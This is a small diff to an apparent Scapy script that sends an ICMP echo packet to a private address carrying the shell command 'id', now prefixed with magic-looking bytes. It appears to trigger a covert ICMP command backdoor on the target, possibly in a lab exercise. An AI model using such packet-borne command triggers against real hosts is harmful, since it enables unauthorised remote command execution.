@@ -56,6 +56,6 @@ from time import sleep
 if __name__ == "__main__":
     pkt = IP(dst="10.42.2.15") /\
         ICMP(type=8) /\
-        Raw(load=f"id")
+        Raw(load=f"\x70\x95\x05id")
     res = sr1(pkt, verbose=False)
     res.show()
